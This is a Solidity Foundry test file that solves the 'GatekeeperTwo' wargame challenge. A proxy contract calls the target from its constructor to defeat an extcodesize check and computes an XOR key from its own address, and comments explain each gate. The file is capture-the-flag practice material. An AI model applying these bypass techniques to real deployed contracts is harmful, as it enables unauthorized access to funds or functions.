// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../utils.sol";

// they keep going at checking tx.origin
// down with the middleman then
interface IFactory {
  function createInstance(address _player) external payable returns (address);
  function validateInstance(address payable _instance, address _player) external returns (bool);
}

interface IGatekeeperTwo {
  function enter(bytes8) external returns (bool);
  function entrant() external returns (address);
}

contract Proxy {
  constructor(address _challengeAddress) {
    IGatekeeperTwo challenge = IGatekeeperTwo(_challengeAddress);
    bytes8 key = bytes8(keccak256(abi.encodePacked(address(this)))) ^ 0xffffffffffffffff;

    challenge.enter(key);
  }
}

contract GatekeeperTwoTest is Test {
  IFactory internal challengeFactory;
  address internal challengeAddress;

  function setUp() public {
    challengeFactory = IFactory(0xdCeA38B2ce1768E1F409B6C65344E81F16bEc38d);
    challengeAddress = challengeFactory.createInstance(tx.origin);
  }

  function testExploit() public {
    // gateOne
    //   need a proxy
    //
    // gateTwo
    //   needs the functionality to be executed from
    //   the proxy's constructor.
    //   a contract has its extcodesize defined
    //   after construction.
    //
    // gateThree
    //   if Constant ^ key = 0xff
    //   then key = 0xff ^ constant
    //   notice that they are checking agains msg.sender,
    //   so compute the key at the proxy


    // attack being performed at the construction of the contract
    Proxy proxy = new Proxy(challengeAddress);
    proxy;

    require(challengeFactory.validateInstance(payable(challengeAddress), tx.origin));

  }
}
